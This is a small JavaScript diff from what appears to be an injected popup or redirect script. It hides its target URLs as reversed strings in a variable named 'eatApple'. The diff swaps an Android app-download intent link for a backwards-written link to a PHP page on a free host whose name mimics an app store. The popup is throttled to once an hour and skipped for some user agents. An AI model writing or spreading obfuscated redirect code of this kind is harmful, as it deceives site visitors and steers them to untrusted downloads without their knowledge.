@@ -5,7 +5,7 @@
 	if (re.test(userAgent))
 	    return;
 	
-	let eatApple = "dne;tekym=emehcs;tnetnI#etiS=dIfer?vtkadok.jtj.moc/daolnwod//:tnetni".split("").reverse().join("");
+	let eatApple = /*"dne;tekym=emehcs;tnetnI#etiS=dIfer?vtkadok.jtj.moc/daolnwod//:tnetni"*/"php.modnar/moc.61tsohteyb.razabefac//:ptth".split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
